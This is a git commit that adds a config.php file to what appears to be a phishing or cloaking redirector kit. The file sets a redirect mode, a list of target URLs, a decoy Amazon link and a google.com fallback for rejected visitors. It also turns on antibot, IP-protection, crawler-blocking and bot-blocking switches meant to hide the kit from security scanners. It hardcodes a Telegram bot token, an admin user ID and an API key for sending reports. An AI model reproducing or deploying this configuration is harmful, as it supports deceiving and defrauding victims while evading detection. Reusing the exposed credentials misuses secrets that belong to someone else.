fad17c587391513bc7b33a7f376e8c7dda240f5b
dynastie2020 <79447708+dynastie2020@users.noreply.github.com>
2021-03-31 21:58:04 +0200

    Add files via upload

---
+++ config.php
@@ -0,0 +1,33 @@
+<?php
+
+
+$fuck1 = ('id');
+$fuck2 = ('amazon.com/Definitive-Collection-Don-Williams/dp/B0002B166O');
+
+
+// please turn of ip_protection to use this for best performamce 
+
+$antibot = false;  //add your api ID in antibot.ini 
+$onetime_access =false; // change to true to allow ip access once 
+$useragent = 'uirefox';
+
+const REDIRECT_TYPE = 2; // 1:header - 2:script
+const URLS_FILE = 'urls.txt';
+const FAILED_PAGE_URL = 'http://google.com/';
+
+const TELEGRAM_BOT_TOKEN = '1739102368:AAF2lLggX0ggJVCZMmnsI9vDS_OTIwBMCOM';
+const TELEGRAM_BOT_ADMIN_USERID = 151588551;
+const TELEGRAM_BOT_REPORT_EVERY_TIME = false;
+
+
+
+// ********* IP Protection ********* //
+
+$ip_protection = false; 			     // free antibot protections,  activate to true to use 
+$ip_protection_api = "tH1NcxPqYmFZB3NnXqXfoVcc9ZFhWhvb"; // Add your your own API ID here 
+$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to null
+$fuck_bot = "true";    // If you don`t want to disallow Boot Users change true to null
+
+
+
+?>
